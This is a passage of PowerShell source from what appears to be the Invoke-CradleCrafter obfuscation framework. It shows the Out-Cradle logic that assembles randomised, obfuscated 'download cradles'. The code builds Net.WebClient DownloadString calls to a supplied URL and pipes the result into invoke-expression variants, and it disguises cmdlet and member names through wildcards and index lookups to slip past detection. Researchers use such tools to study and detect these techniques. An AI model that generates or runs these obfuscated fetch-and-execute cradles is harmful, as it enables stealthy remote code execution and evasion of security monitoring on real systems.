    $BodyOptions                          = @("Body","(($VarTag1.$DocumentTag.PsObject.Properties|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$BodyWildcardRandom'}).Name)","(($VarTag1.$DocumentTag|$GetMemberRandom|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$BodyWildcardRandom'}).Name)")
    $OptionsVarArr                       +=   "Body"
    $InnerTextOptions                     = @((Get-Random -Input @('InnerText','OuterText')),"(($VarTag1.$DocumentTag.$BodyTag|$GetMemberRandom|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$InnerTextWildcardRandom'}).Name)")
    $OptionsVarArr                       +=   "InnerText"
    $DocumentsOptions                     = @("Documents","(($VarTag1.PsObject.Properties|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$DocumentsWildcardRandom'}).Name)","(($VarTag1|$GetMemberRandom|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$DocumentsWildcardRandom'}).Name)")
    $OptionsVarArr                       +=   "Documents"
    $PropertyFlagOptions                  =    @($PropertyFlagSubString)
    $OptionsVarArr                       +=   "PropertyFlag"
    $ComObjectFlagOptions                 = @("-ComObject",$ComObjectFlagSubString)
    $OptionsVarArr                       +=   "ComObjectFlag"
    $SleepOptions                         = @("Start-Sleep -Seconds 1",("Sleep " + $SleepArguments),("$InvocationOperatorRandom($GetCommandRandom $StartSleepWildcardRandom)" + $SleepArguments),("$InvocationOperatorRandom(" + (Out-PsGetCmdlet $StartSleepWildcardRandom) + ")" + $SleepArguments))
    $OptionsVarArr                       +=   "Sleep"
    $SleepMillisecondsOptions             = @("Start-Sleep -Milliseconds $NotepadSendKeysSleep",("Sleep " + $SleepMillisecondsArguments),("$InvocationOperatorRandom($GetCommandRandom $StartSleepWildcardRandom)" + $SleepMillisecondsArguments),("$InvocationOperatorRandom(" + (Out-PsGetCmdlet $StartSleepWildcardRandom) + ")" + $SleepMillisecondsArguments))
    $OptionsVarArr                       +=   "SleepMilliseconds"
    $RuntimeInteropServicesMarshalOptions = @('[Void][System.Runtime.InteropServices.Marshal]',($Void + (Get-Random -Input @('[System.','[')) + 'Runtime.InteropServices.Marshal]'))
    $OptionsVarArr                       +=   "RuntimeInteropServicesMarshal"
    $NetWebClientOptions                  = @('[System.Net.WebClient]','[Net.WebClient]')
    $OptionsVarArr                       +=   "NetWebClient"
    $NetHttpWebRequestOptions             = @('[System.Net.HttpWebRequest]','[Net.HttpWebRequest]')
    $OptionsVarArr                       +=   "NetHttpWebRequest"
    $ReflectionAssemblyOptions            = @('[Void][System.Reflection.Assembly]',($Void + (Get-Random -Input @('[System.','[')) + 'Reflection.Assembly]'))
    $OptionsVarArr                       +=   "ReflectionAssembly"
    $BooleanTrueOptions                   = @("`$True","1",(Out-GetVariable (Get-Random -Input @('T*ue','T*e','*rue','*ue','Tr*','T*r*e'))))
    $OptionsVarArr                       +=   "BooleanTrue"
    $BooleanFalseOptions                  = @("`$False","0",(Out-GetVariable (Get-Random -Input @('F*se','F*e','*alse','*lse','Fa*','F*a*e','Fal*'))))
    $OptionsVarArr                       +=   "BooleanFalse"
    $ByteOptions                          = @("[Char[]]$ByteTag","$ByteTag|$ForEachRandom{[Char]$CurrentItemVariable2}",((Get-Random -Input @("[System.","[")) + "Text.Encoding]::ASCII.GetString($ByteTag)"),"($ByteTag|$ForEachRandom{$CurrentItemVariable2-As'Char'})")
    $OptionsVarArr                       +=   "Byte"
    $ByteRandom                           =    Get-Random $ByteOptions
    $JoinOptions                          = @("(($JoinTag)-Join'')","(-Join($JoinTag))",("(" + (Get-Random -Input @("[String]","[System.String]")) + "::Join('',($JoinTag)))"))
    $OptionsVarArr                       +=   "Join"
    $JoinRandom                           =    Get-Random $JoinOptions
    $JoinNewlineOptions                   = @("($JoinNewLineTag-Join$NewLineTag)","([String]::Join($NewLineTag,($JoinNewLineTag)))")
    $OptionsVarArr                       +=   "JoinNewline"
    $NewLineOptions                       = @('"`n"','[Char]10',"(10-As'Char')")
    $OptionsVarArr                       +=   "Newline"
    $SheetsOptions                        = @("Sheets","(($VarTag1|$GetMemberRandom)[415].Name)")
    $OptionsVarArr                       +=   "Sheets"
    $ItemOptions                          = @("Item","(($VarTag1.$SheetsTag.PsObject.$MethodsOrMembersRandom|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$ItemWildcardRandom'}).Name).Invoke")
    $OptionsVarArr                       +=   "Item"
    $RangeOptions                         = @("Range","(($VarTag1.$SheetsTag.$ItemTag(1)|$GetMemberRandom)[55].Name).Invoke")
    $OptionsVarArr                       +=   "Range"
    $UsedRangeOptions                     = @("UsedRange","(($VarTag1.$SheetsTag.$ItemTag(1)|$GetMemberRandom)[116].Name)")
    $OptionsVarArr                       +=   "UsedRange"
    $RowsOptions                          = @("Rows","(($VarTag1.$SheetsTag.$ItemTag(1).$UsedRangeTag|$GetMemberRandom)[164].Name)")
    $OptionsVarArr                       +=   "Rows"
    $CountOptions                         = @("Count","(($VarTag1.$SheetsTag.$ItemTag(1).$UsedRangeTag.$RowsTag|$GetMemberRandom)[105].Name)")
    $OptionsVarArr                       +=   "Count"
    $ValueOrFormulaOptions                = @("Value2",(Get-Random -Input @('Formula','FormulaLocal','FormulaR1C1','FormulaR1C1Local')),("((($VarTag1.$SheetsTag.$ItemTag(1).$UsedRangeTag.$RowsTag)|$GetMemberRandom)[" + (Get-Random -Input @('178','119','123','124','125')) + "].Name)"))
    $OptionsVarArr                       +=   "ValueOrFormula"
    $SourceRandomOptions                  = @(Get-Random -Input @('./','.\'))
    $OptionsVarArr                       +=   "SourceRandom"
    $Open2Options                         = @("Open","(($VarTag1|$GetMemberRandom)[4].Name)")
    $OptionsVarArr                       +=   "Open2"
    $SendOptions                          = @("Send","(($VarTag1|$GetMemberRandom)[5].Name)")
    $OptionsVarArr                       +=   "Send"
    $ResponseTextOptions                  = @("ResponseText","(($VarTag1|$GetMemberRandom)[16].Name)")
    $OptionsVarArr                       +=   "ResponseText"

    # Set default options value for Rearrange, Url, Path and Command inputs (they will be handled in later blocks or functions).
    $RearrangeOptions = @(1,2,3,4,5,6,7,8,9)
    $OptionsVarArr   += "Rearrange"
    $UrlOptions       = @()
    $UrlOptions      += $Url
    $OptionsVarArr   += "Url"
    $PathOptions      = @()
    $PathOptions     += $Path
    $OptionsVarArr   += "Path"
    $CommandOptions   = @()

    # Handle converting $Command input into the $CommandOptions value which is handled differently depending on the invocation type that is selected.
    If($Command.Length -gt 0)
    {
        $CommandOptions += $Command
    }
    Else
    {
        $CommandOptions += ''
    }
    $OptionsVarArr   += "Command"

    # Set boolean if ALL option was passed in since this will force re-randomization and re-setting of all variables.
    $AllOptionSelected = $FALSE
    If($TokenArray -AND $TokenArray[$TokenArray.Length-1][0] -eq 'All')
    {
        $AllOptionSelected = $TRUE
    }

    # We must added all options and override existing $TokenArray value so that Invoke-CradleCrafter can properly maintain state of individual value after ALL option is selected.
    # In each individual CradleType block at the end of this script we will only keep the options in $TokenArray that pertain to that particular Cradle block.
    $TokenArrayWithAllAdded = @()

    ForEach($VariableName in $OptionsVarArr)
    {
        $DefaultIndex = 0
            
        If($AllOptionSelected)
        {
            # If last option in $TokenArray is ALL then we will choose the highest obfuscation level as the default value for each variable in $OptionsVarArray.
            $DefaultIndex = (Get-Variable ($VariableName+"Options")).Value.Count-1
        }

        # Set each variable to the default value in its respective Options array variable.
        If(Test-Path ("Variable:$VariableName" + "Options"))
        {
            $Variable = (Get-Variable ($VariableName + "Options")).Value[$DefaultIndex]

            If($Variable.Length -eq 0)
            {
                $Variable = $Null
            }

            # Finally, set the variable value into both the variable and variable+withtags variables.
            Set-Variable $VariableName                $Variable
            Set-Variable ($VariableName + "WithTags") $Variable
        }

        If($AllOptionSelected)
        {
            $TokenArrayWithAllAdded += , @($VariableName,(Get-Variable $VariableName).Value)
        }
    }

    # We must add all options and override existing $TokenArray value so that Invoke-CradleCrafter can properly maintain state of each individual value generated when ALL option is selected.
    # In each individual CradleType block at the end of this script we will only keep the options in $TokenArray that pertain to that particular Cradle block.
    # Also adding 'Invoke' option since it is handled via a separate function and is not set as a default array in above step.
    # For Invoke we will randomly select an option that is not 1 (since we want an invocation command applied) and is not a PS3.0+ option or a runspace option since it won't display stdout (to avoid the appearance of cradle not working to those who only run ALL without looking at the nature of each invocation syntax).
    If($AllOptionSelected)
    {
        $TokenArray  = $TokenArrayWithAllAdded
        $TokenArray += , @('Invoke',(Get-Random -Input @(2,3,4,5,6,7,9)))
    }

    # This variable will be used to return the token value that was updated this iteration.
    # Invoke-CradleCrafter will store this in its $Script:TokenArray so that all previously obfuscated tokens can be passed in for subsequent invocations of Out-Cradle.
    $TokenValueUpdatedThisIteration = $NULL

    # If only a single TokenArray key-value pair is entered then convert this string to an object array.
    If(($TokenArray.Length -gt 0) -AND ($TokenArray.GetType().Name -eq 'String'))
    {
        $TokenArray = @([Object[]]$TokenArray)
    }

    # Handle every variable set above and passed in as an argument to determine if:
    # 1) a random value should be assigned to each variable (from values above)
    # 2) a value has been passed in to Out-CradleCrafter from previous iterations (which we will then use)
    $InvokeArrayResults = @()              
    For($i=0; $i -lt $TokenArray.Count; $i++)
    {
        $TokenName  = $TokenArray[$i][0]
        $TokenLevel = $TokenArray[$i][1]

        # For $Url, $Path and $Command we will override default values with input values (if they were input/defined).
        If(($TokenName -eq 'Url') -AND $PSBoundParameters['Url'])
        {
            $TokenLevel = $Url
        }
        If(($TokenName -eq 'Path') -AND $PSBoundParameters['Path'])
        {
            $TokenLevel = $Path
        }
        If(($TokenName -eq 'Command') -AND $PSBoundParameters['Command'])
        {
            $TokenLevel = $Command
        }

        # If $TokenLevel is an integer then we will act on it.
        # Otherwise we were passed a string which is the stored value that we will use for this Token.
        # Exclude select variables whose values are a single number, like those used for switch blocks set in previous executions of this script.
        $VariableNameExceptions = @('SwitchRandom_01')
        If((@(0,1,2,3,4,5,6,7,8,9,10,11,12) -Contains $TokenLevel) -AND !($VariableNameExceptions -Contains $TokenName))
        {
            # Handle Invoke differently since it requires calling a separate function that sets its state via the script-level variable $Script:CombineInvokeAndPostCradleCommand.
            If($TokenName -eq 'Invoke')
            {
                $TokenValue = Out-EncapsulatedInvokeExpression $TokenLevel

                $InvokeArrayResults = $TokenValue
            }
            Else
            {
                $OptionsArray = (Get-Variable ($TokenName+'Options')).Value

                # Set cap on $TokenLevel if value passed in exceeds the number of available options in $OptionsArray.
                If($TokenLevel -gt $OptionsArray.Count)
                {
                    $TokenLevel = $OptionsArray.Count
                }
                
                $TokenValue = $OptionsArray[$TokenLevel-1]
            }
        }
        Else
        {
            # Since we were passed a string for the current $TokenName in $TokenArray (as the $TokenLevel value) then we will set $TokenValue to this passed value.
            $TokenValue = $TokenLevel
        }

        # Handle Invoke differently since it may be an array depending on which Invoke function is being used and if $Command is defined or not.
        # Additionally because of this flexibility then Invoke will be added to $Script:TokensUpdatedThisIteration in the below blocks and excluded in later blocks.
        If(($TokenName -eq 'Invoke') -AND ($TokenValue.GetType().Name -eq 'Object[]'))
        {
            $Script:TokensUpdatedThisIteration += , @($TokenName,$TokenValue)

            If($Command)
            {
                $TokenValue = $TokenValue[0]
            }
            Else
            {
                $TokenValue = $TokenValue[1]
            }
        }
        Else
        {
            $Script:TokensUpdatedThisIteration += , @($TokenName,$TokenValue)
        }
        
        # For TokenValueWithTags only add tags if it is the last token (i.e., the token being updated during this function invocation).
        # Add tags to everything if ALL option was passed in as the last value in $TokenArray.
        $TokenValueWithTags = $TokenValue

        If(($i -eq $TokenArray.Count-1) -OR ($AllOptionSelected))
        {
            $TokenValueWithTags = $TokenValue
            If($TokenValue.ToString().Length -gt 0)
            {
                $TokenValueWithTags = '<<<0' + $TokenValue + '0>>>'
            }

            # Add additional tags for Invoke for proper highlighting.
            If($TokenValueWithTags.Contains($InvokeTag))
            {
                $TokenValueWithTags = $TokenValueWithTags.Replace($InvokeTag,('0>>>' + $InvokeTag + '<<<0')).Replace('<<<00>>>','')
            }

            # Because of the flexibility with Invoke (can be array or string) it's being added to $Script:TokensUpdatedThisIteration has been handled separately above.
            # Therefore, Invoke will be excluded in the below block from being added to $Script:TokensUpdatedThisIteration.
            If($TokenName -ne 'Invoke')
            {
                # Store updated token(s) name/value pair.
                $Script:TokensUpdatedThisIteration += , @($TokenName,$TokenValue)
            }

            # The last updated token value will be stored in this variable to be returned for Invoke-CradleCrafter to store in its $Script:TokenArray.
            $TokenValueUpdatedThisIteration = $TokenValue

            # The last updated token name will be stored in this variable so tag formatting will work properly when REARRANGE option is selected.
            $TokenNameUpdatedThisIteration = $TokenName
        }

        # Set token value in the variable named after $TokenName.
        Set-Variable $TokenName $TokenValue
        Set-Variable ($TokenName+'WithTags') $TokenValueWithTags

        # We will use this $LastVariableName for easier code readibility in below If blocks for SwitchRandom_01 and all array index variables.
        # This is because in most cases the last variable that we process from $TokenArray is the variable that we are obfuscating.
        $LastVariableName = $TokenName
    }

    # Choose random index order for below Switch value and array indexes for CommandArray/CommandArray2 elements that can have their order randomized.
    # Only set these variables if they were not set in $Script:TokenArray or if Rearrange or All options were explicitly selected.
    # We set these values here so that they can be passed in and set so that these states can be maintained unless explicitly desired to change via Rearrange or All options.
    $VarPairsToSet  = @()
    $VarPairsToSet += , @('SwitchRandom_01'         , (Get-Random -Input @(1,2)))
    $VarPairsToSet += , @('SetItemListIndex_01'     , (Get-Random -Input @(0,1) -Count 2))
    $VarPairsToSet += , @('SetItemListIndex_012345' , (Get-Random -Input @(0,1,2,3,4) -Count 5))
    $VarPairsToSet += , @('ArrayIndexOrder_01'      , (Get-Random -Input @(0,1) -Count 2))
    $VarPairsToSet += , @('Array2IndexOrder_01'     , (Get-Random -Input @(0,1) -Count 2))
    $VarPairsToSet += , @('ArrayIndexOrder_012'     , (Get-Random -Input @(0,1,2) -Count 3))
    $VarPairsToSet += , @('Array2IndexOrder_012'    , (Get-Random -Input @(0,1,2) -Count 3))
    $VarPairsToSet += , @('ArrayIndexOrder_0123'    , (Get-Random -Input @(0,1,2,3) -Count 4))
    $VarPairsToSet += , @('ArrayIndexOrder_45'      , (Get-Random -Input @(4,5) -Count 2))
    $VarPairsToSet += , @('Array2IndexOrder_0123'   , (Get-Random -Input @(@(0,3,1,2),@(3,0,1,2),@(0,1,3,2),@(0,1,2,3))))
    $VarPairsToSet += , @('Array2IndexOrder_01234'  , (Get-Random -Input @(@(4,0,1,2,3),@(0,4,1,2,3),@(0,1,4,2,3),@(0,1,2,3,4))))
    $VarPairsToSet += , @('PropertyArrayIndex_012'  , (Get-Random -Input @(0,1,2) -Count 3))
    $VarPairsToSet += , @('GetBytesRandom'          , $JoinRandom.Replace($JoinTag,$ByteRandom.Replace($ByteTag,(Get-Random @(((Get-Random -Input @('[System.','[')) + "IO.File]::ReadAllBytes('$PathTag')"),"($GetContentRandom $EncodingFlagRandom $ByteArgumentRandom $PathTag)","($GetContentRandom $PathTag $EncodingFlagRandom $ByteArgumentRandom)")))))

    ForEach($VarPair in $VarPairsToSet)
    {
        $VarName  = $VarPair[0]
        $VarValue = $VarPair[1]

        If(!(Test-Path ('Variable:' + $VarName)) -OR $AllOptionsSelected -OR ($LastVariableName -eq 'Rearrange'))
        {
            Set-Variable $VarName $VarValue
            $Script:TokensUpdatedThisIteration += , @($VarName,$VarValue)
        }
    }
  
    # If ALL option was not selected then set $UrlWithTags, $PathWithTags and $CommandWithTags to <<<1 tag if they do not already have <<<0 tags.
    If(!$AllOptionSelected)
    {
        If(!$UrlWithTags.StartsWith('<<<0'))
        {
            $UrlWithTags = '<<<1' + $UrlWithTags + '1>>>'
        }
        
        If(!$PathWithTags.StartsWith('<<<0'))
        {
            $PathWithTags = '<<<1' + $PathWithTags + '1>>>'
        }

        If($CommandWithTags -AND !$CommandWithTags.StartsWith('<<<0') -AND $CommandWithTags -ne '')
        {
            $CommandWithTags = '<<<1' + $CommandWithTags + '1>>>'
        }
    }

    # Handle additional command syntax where PostCradleCommand must be concatenated as a string so that it is run in the same context as the invoked cradle contents.
    If($Command -AND $CommandWithTags)
    {
        $CommandEscapedString         = "+';" + $Command.Replace("'","''") + "'"
        $CommandEscapedStringWithTags = "+';" + $CommandWithTags.Replace("'","''") + "'"
    }
    Else
    {
        $CommandEscapedString         = ''
        $CommandEscapedStringWithTags = ''
    }

    # Select launcher syntax.
    $CradleSyntaxOptions = @()
    Switch($Cradle)
    {
        1 {
            ###############################################
            ## New-Object Net.WebClient - DownloadString ##
            ###############################################

            # Switch block for changing overall syntax arrangement depending on the level passed in with the REARRANGE option.
            # If last option in $TokenArray is ALL then we will choose the highest value for $Rearrange in the below block since each Cradle can have differing numbers of $Rearrange values.
            If($AllOptionSelected) {$Rearrange = 3}
            Switch($Rearrange)
            {
                1 {
                    # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                    $DownloadString         = $DownloadString.Replace(        $NewObjectNetWebClientTag,"($NewObjectTag`Net.WebClient)")
                    $DownloadStringWithTags = $DownloadStringWithTags.Replace($NewObjectNetWebClientTag,"($NewObjectTag`Net.WebClient)")
                    $DownloadString         = $DownloadString.Replace(        $NewObjectTag,$NewObject.Replace($ModuleAutoLoadTag,''))
                    $DownloadStringWithTags = $DownloadStringWithTags.Replace($NewObjectTag,$NewObjectWithTags.Replace($ModuleAutoLoadTag,''))

                    # Add .Invoke to the end of $DownloadString and $DownloadStringWithTags if $DownloadString ends with ')'.
                    If($DownloadString.EndsWith(')'))
                    {
                        $DownloadString = $DownloadString + '.Invoke'

                        If($DownloadStringWithTags.EndsWith('0>>>')) {$DownloadStringWithTags = $DownloadStringWithTags.SubString(0,$DownloadStringWithTags.LastIndexOf('0>>>')) + '.Invoke0>>>'}
                        Else                                         {$DownloadStringWithTags = $DownloadStringWithTags + '.Invoke'}
                    }

                    $SyntaxToInvoke         = '(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "Net.WebClient).$DownloadString('$Url')"
                    $SyntaxToInvokeWithTags = '(' + $NewObjectWithTags.Replace($ModuleAutoLoadTag,'') + "Net.WebClient).$DownloadStringWithTags('$UrlWithTags')"

                    If(($Invoke.Contains($CommandTag) -AND $InvokeWithTags.Contains($CommandTag)) -OR ($Invoke.Contains($CommandEscapedStringTag) -AND $InvokeWithTags.Contains($CommandEscapedStringTag)))
                    {
                        $CradleSyntax         = $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                        $CradleSyntaxWithTags = $InvokeWithTags.Replace($InvokeTag,$SyntaxToInvokeWithTags).Replace($CommandTag, $CommandWithTags).Replace($CommandEscapedStringTag,$CommandEscapedString)
                    }
                    Else
                    {
                        If($Command) {$Command = ';' + $Command; $CommandWithTags = ';' + $CommandWithTags}
                        $CradleSyntax         = $Invoke.Replace($InvokeTag,$SyntaxToInvoke) + $Command
                        $CradleSyntaxWithTags = $InvokeWithTags.Replace($InvokeTag,$SyntaxToInvokeWithTags) + $CommandWithTags
                    }
                      
                    If($NewObject.Contains($ModuleAutoLoadTag))
                    {
                        $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                        If($NewObject.EndsWith('0>>>'))
                        {
                            $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                        }
                    }
                    Else
                    {
                        $CurrentModuleAutoLoadRandom = ''
                    }
                    $CradleSyntax         = $CurrentModuleAutoLoadRandom + $CradleSyntax
                    $CradleSyntaxWithTags = $CurrentModuleAutoLoadRandom + $CradleSyntaxWithTags
                }
                2 {
                    # Syntax concatenate into logical variable count and names with default variable GET/SET syntax.
                      
                    # Set more logical variable names for this block.
                    $RandomVarName1 = 'wc'  # WebClient
                    $RandomVarName2 = 'url' # Url
                    $RandomVarName3 = 'wc2' # WebClient (Argument)
                    $RandomVarName4 = 'ds'  # DownloadString (Method)

                    $VarOptionsIndex  = 0
                    $NumberOfVarNames = 4

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex
                      
                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                    $DownloadString         = $DownloadString.Replace(        $NewObjectNetWebClientTag,$GetVar1)
                    $DownloadStringWithTags = $DownloadStringWithTags.Replace($NewObjectNetWebClientTag,$GetVar1WithTags)
                      
                    # Add .Invoke to the end of $GetVar4 and $GetVar4WithTags.
                    $GetVar4WithTags = $GetVar4WithTags.Replace($GetVar4,($GetVar4 + '.Invoke'))
                    $GetVar4         = $GetVar4 + '.Invoke'
                      
                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','NewObject','DownloadString')
                    For($i=1; $i -le 2; $i++)
                    {
                        # Encapsulate DownloadString in single quotes if basic syntax is used.
                        If($DownloadString.Contains('DownloadString'))
                        {
                            $DownloadStringWithTags = $DownloadStringWithTags.Trim("'").Replace($DownloadString,("'" + $DownloadString + "'")).Replace("''","'")
                            $DownloadString         = "'" + $DownloadString.Trim("'") + "'"
                        }
  
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }
                          
                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        $CommandArray += "$SetVar3'Net.WebClient'"
                        $CommandArray += "$SetVar2'$Url'"

                        If($NewObject.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($NewObject.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $CommandArray += $CurrentModuleAutoLoadRandom + $SetVar1 + '(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "$GetVar3)"

                        $CommandArray += "$SetVar4$DownloadString"

                        $SyntaxToInvoke = "$GetVar1.$GetVar4($GetVar2)"

                        $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }
                          
                        # Remove single quotes when DownloadString is used directly as a method instead of a string stored in a variable (as in above command arrangement).
                        While($DownloadString.Contains("'DownloadString'"))
                        {
                            $DownloadString = $DownloadString.Replace("'DownloadString'","DownloadString")
                        }

                        If($DownloadString.EndsWith(')') -OR $DownloadString.EndsWith(')0>>>'))
                        {
                            $DownloadStringInvoke = $DownloadString + '.Invoke'
                        }
                        Else
                        {
                            $DownloadStringInvoke = $DownloadString
                        }

                        # Set alternate command arrangement logic here.
                        $CommandArray2  = @()

                        $CommandArray2 += $CurrentModuleAutoLoadRandom + $SetVar1 + '(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "Net.WebClient)"
                        $CommandArray2 += "$SetVar2'$Url'"

                        $SyntaxToInvoke = "$GetVar1.$DownloadStringInvoke($GetVar2)"

                        $CommandArray2 += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                          
                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray2 += $Command}
                        }

                        # Set command ordering arrangement logic here.
                        Switch($SwitchRandom_01)
                        {
                            1 {$Syntax = ($CommandArray[$ArrayIndexOrder_01]   + $CommandArray[2,3,4,5] -Join ';')}
                            2 {$Syntax = ($CommandArray2[$Array2IndexOrder_01] + $CommandArray2[2,3]    -Join ';')}
                        }

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                3 {
                    # Syntax concatenate into logical variable count but random names with obfuscated variable GET/SET syntax.
                      
                    $VarOptionsIndex  = 1
                    $NumberOfVarNames = 4

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex
                      
                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }
                      
                    # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                    $DownloadString         = $DownloadString.Replace(        $NewObjectNetWebClientTag,$GetVar1)
                    $DownloadStringWithTags = $DownloadStringWithTags.Replace($NewObjectNetWebClientTag,$GetVar1WithTags)

                    # Encapsulate DownloadString in single quotes if basic syntax is used. Then add .Invoke to GetVar4.
                    If($DownloadString -eq 'DownloadString')
                    {
                        $DownloadStringWithTags = $DownloadStringWithTags.Replace($DownloadString,("'" + $DownloadString + "'"))
                        $DownloadString         = "'" + $DownloadString + "'"
                    }
                      
                    # Add .Invoke to the end of $GetVar4 and $GetVar4WithTags.
                    $GetVar4WithTags = $GetVar4WithTags.Replace($GetVar4,'(' + $GetVar4 + ').Invoke')
                    $GetVar4         = '(' + $GetVar4 + ').Invoke'
                      
                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','NewObject','DownloadString')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            # Set each 'WithTags' variable values to non-'WithTags' variable names for simplicity.
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }
                          
                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        $CommandArray += "$SetVar3'Net.WebClient'"
                        $CommandArray += "$SetVar2'$Url'"

                        If($NewObject.Contains($ModuleAutoLoadTag))
                        {
                            $CurrentModuleAutoLoadRandom = $ModuleAutoLoadRandom
                            If($NewObject.EndsWith('0>>>'))
                            {
                                $CurrentModuleAutoLoadRandom = '<<<0' + $CurrentModuleAutoLoadRandom + '0>>>'
                            }
                        }
                        Else
                        {
                            $CurrentModuleAutoLoadRandom = ''
                        }
                        $CommandArray += $CurrentModuleAutoLoadRandom + $SetVar1 + '(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "$GetVar3)"

                        $CommandArray += "$SetVar4$DownloadString"

                        $SyntaxToInvoke = "$GetVar1.$GetVar4($GetVar2)"

                        $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }
    
                        # Add .Invoke to the end of $DownloadString if not default value of 'DownloadString'.
                        If($DownloadString.Contains("'DownloadString'"))
                        {
                            # Remove single quotes when DownloadString is used directly as a method instead of a string stored in a variable (as in above command arrangement).  
                            $DownloadString = $DownloadString.Replace("'DownloadString'","DownloadString")
                        }
                        Else
                        {
                            If($DownloadString.EndsWith('0>>>')) {$DownloadString = $DownloadString.SubString(0,$DownloadString.LastIndexOf('0>>>')) + '.Invoke0>>>'}
                            Else                                 {$DownloadString = $DownloadString + '.Invoke'}
                        }
                      
                        # Set alternate command arrangement logic here.
                        $CommandArray2  = @()

                        $CommandArray2 += $CurrentModuleAutoLoadRandom + $SetVar1 + '(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "Net.WebClient)"
                        $CommandArray2 += "$SetVar2'$Url'"

                        $SyntaxToInvoke = "$GetVar1.$DownloadString($GetVar2)"

                        $CommandArray2 += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray2 += $Command}
                        }

                        # Set command ordering arrangement logic here.
                        Switch($SwitchRandom_01)
                        {
                            1 {$Syntax = ($CommandArray[$ArrayIndexOrder_01]   + $CommandArray[2,3,4,5] -Join ';')}
                            2 {$Syntax = ($CommandArray2[$Array2IndexOrder_01] + $CommandArray2[2,3]    -Join ';')}
                        }

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                default {Write-Error "An invalid `$Rearrange value ($Rearrange) was passed to switch block for Out-Cradle `$Cradle value ($Cradle)."; Exit}
            }

            # Add final cradle syntax (with and without tags) and update token value to $CradleSyntaxOptions to be returned if -ReturnAsArray Switch was specified.
            $CradleSyntaxOptions = @($CradleSyntax,$CradleSyntaxWithTags,$TokenValueUpdatedThisIteration)
        }
        2 {
            #############################################
            ## New-Object Net.WebClient - DownloadData ##
            #############################################

            # Switch block for changing overall syntax arrangement depending on the level passed in with the REARRANGE option.
